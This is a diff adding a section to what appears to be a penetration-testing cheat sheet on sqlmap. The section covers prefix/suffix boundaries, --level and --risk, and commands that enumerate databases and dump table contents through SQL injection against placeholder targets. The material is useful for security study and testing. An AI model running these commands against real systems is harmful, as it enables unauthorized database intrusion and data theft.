@@ -255,6 +255,46 @@ sqlmap -r req.txt
 ```
 *Note: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (\*), such as '/?id=\*'.*
 
+#### Prefix/Suffix
+
+There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.
+For such runs, options --prefix and --suffix can be used as follows:
+```
+sqlmap -r req.txt --prefix="%'))" --suffix="-- -"
+```
+
+#### Level/Risk
+By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.
+
+For such demands, the options --level and --risk should be used:
+
+- The option `--level` sets aggressiveness of tests (range: 1–5). Level 5 enables the most in-depth payloads, including more techniques and headers.
+- The option `--risk` sets risk level of tests (range: 1–3). Risk 3 allows more invasive queries that could potentially alter data or slow the server.
+- When you change `--level` and `--risk` in SQLMap, the tool starts using different kinds of payloads and injection points (headers, parameters, cookies, etc.). But it’s not always obvious what it’s doing behind the scenes. However we can set the verbosity level with `-v` (range: p-5).
+
+```
+sqlmap -u '<target>' --level=5 --risk=3 --prefix=')`' --no-cast --dbs --tables
+```
+- The `--no-cast` flag disables automatic data type casting, preventing SQLMap from altering values (useful to avoid bypass failures or logic issues).
+- The `--dbs` instructs sqlmap to enumerate and list all database names upon successful injection.
+- Once a current database is identified, the `--tables` option lists all tables within it.
+
+*Note: --tables assumes sqlmap is already operating inside a known database context — either from --current-db or an explicit -D <database> flag.*
+```
+sudo sqlmap '<target>' --level=5 --risk=3 --prefix='`)' --no-cast -D <database> -T <table_name> --dump
+```
+```
+sqlmap -r case5.txt --level=5 --risk=3 -v 3 -T <table_name> --no-cast --dump
+```
+
+- The `-T` falg focuses SQLMap to enumerate/dump data from the table named `<table_name>`.
+- The `--dump` flag instructs SQLMap to dump all data from the selected table (`<table_name>`) after successful injection.
+
+```
+sqlmap -u <target> --union-cols=<number> --level=5 --risk=3 --batch --dbs --tables
+```
+- `--union-cols=<number>`	manually sets the number of columns to be used in UNION SELECT injections.
+- `--batch`	runs sqlmap in non-interactive mode (auto-answers all prompts).
 
 
 
